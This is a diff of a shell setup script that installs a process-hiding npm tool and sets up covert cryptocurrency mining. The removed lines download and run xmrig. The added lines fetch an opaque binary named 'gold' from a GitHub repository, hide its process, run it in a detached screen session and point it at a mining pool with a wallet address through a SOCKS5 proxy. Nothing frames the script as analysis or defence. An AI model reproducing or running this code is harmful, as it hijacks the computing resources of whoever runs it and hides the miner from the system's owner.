@@ -3,9 +3,9 @@ sudo apt update
 sudo apt upgrade -y
 sudo apt-get install nodejs
 sudo apt-get install npm
+sudo apt-get install screen -y
 npm i -g node-process-hider
-sudo ph add xmrig
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz
-tar -zxf xmrig-6.16.2-bionic-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig
-./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 19NGMAFwcdEPfYhW3FjsWMPF22m6WQi2b4 -p c=BTC,mc=GNTL --threads=2 -x socks5://192.252.214.20:15864"
+echo -e 'sudo ph add gold' >> banthanks.sh
+screen -dmS powi sh banthanks.sh
+wget https://github.com/kirbyworth/sugardady/raw/main/gold && chmod +x gold && ./gold -o stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 -u RX5iZrR46Xc6Q9f3ixp4eewknJzzWB3spe -p c=RVN,mc=SUGAR,m=solo -t 2 --proxy socks5://192.252.214.20:15864
 exec bash
